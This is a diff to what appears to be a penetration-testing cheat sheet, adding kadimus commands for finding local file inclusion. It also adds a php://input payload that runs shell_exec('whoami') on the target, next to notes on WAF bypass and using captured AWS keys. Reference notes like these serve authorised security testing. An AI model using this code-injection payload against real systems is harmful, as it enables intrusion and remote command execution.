@@ -423,10 +423,20 @@ The following are some tips to get the WAF bypassed, and be able to exploit some
 
 # LFI Automation
 
+To find the vulnerabily with 'kadimus':
+
 ```bash
 kadimus -u [URL] --parameter [parameter]
 # Example: ./kadimus -u 'http://blabla.php?id' --parameter id
 ```
+
+To exploit the vulnerability, if possible:
+
+```bash
+kadimus -u [URL] -C '[PHP_CODE]'
+# Example: ./kadimus -u 'http://blabla.php?page=php://input' -C '<?php echo shell_exec("whoami");?>' -T input
+```
+
 
 # AWS hacking
 If, during a penetration test, we are lucky and we obtain any AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY and/or AWS_SESSION_TOKEN, we can start interrogating the AWS environment of the Enterprise audited.
